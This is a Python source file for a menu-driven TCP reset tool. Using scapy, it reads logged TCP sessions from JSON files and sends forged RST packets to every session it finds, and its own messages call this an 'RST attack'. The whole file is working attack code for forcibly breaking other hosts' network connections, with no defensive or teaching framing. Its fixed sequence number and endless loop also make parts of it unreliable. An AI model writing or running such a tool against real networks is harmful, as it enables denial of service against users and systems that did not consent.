#!/usr/bin/env python3
import json
import glob
import os
import time
import threading
from scapy.all import IP, TCP, send

log_folder = "./ip_logs"
seen_sessions = set()
live_sessions = set()
lock = threading.Lock()
running = True

def clear_screen():
    os.system("clear" if os.name == "posix" else "cls")

def watch_ip_logs():
    global live_sessions
    while running:
        files = sorted(glob.glob(os.path.join(log_folder, "*.json")), key=os.path.getmtime)[-100:]
        new_sessions = set()

        for file in files:
            try:
                with open(file, "r") as f:
                    data = json.load(f)
                    if data.get("protocol") != "TCP":
                        continue

                    sess = (
                        data["src_ip"],
                        data["src_port"],
                        data["dst_ip"],
                        data["dst_port"]
                    )

                    new_sessions.add(sess)
            except:
                continue

        with lock:
            live_sessions.update(new_sessions)

        time.sleep(1)

def inject_rst(src_ip, src_port, dst_ip, dst_port, count=10):
    print(f"\n[+] Injecting RST to {src_ip}:{src_port} ← {dst_ip}:{dst_port}")
    for _ in range(count):
        pkt = IP(src=dst_ip, dst=src_ip) / TCP(sport=dst_port, dport=src_port, flags="R", seq=12345)
        send(pkt, verbose=0)

def mass_rst():
    while True:
        with lock:
            sessions = list(live_sessions)

        if not sessions:
            print("⚠️ No active TCP sessions.")
            return

        print(f"[+] Sending RSTs to {len(sessions)} session(s)...")
        for sess in sessions:
            inject_rst(*sess)
            time.sleep(0.1)

    print("[+] RST attack complete.")

def main():
    global running
    clear_screen()
    print("=== 🛰️ Live TCP RST Menu ===\n")
    print("Watching for live TCP sessions in ./ip_logs")
    print("Press '1' to send RSTs to all current connections.")
    print("Press 'x' + Enter to exit.\n")

    # Start background thread to watch files
    t = threading.Thread(target=watch_ip_logs)
    t.daemon = True
    t.start()

    try:
        while True:
            user_input = input("Command: ").strip().lower()
            if user_input == "1":
                mass_rst()
            elif user_input == "x":
                running = False
                print("👋 Exiting...")
                break
            else:
                print("❌ Invalid input. Type 1 or x.")
    except KeyboardInterrupt:
        running = False
        print("\n👋 Exiting...")

if __name__ == "__main__":
    main()

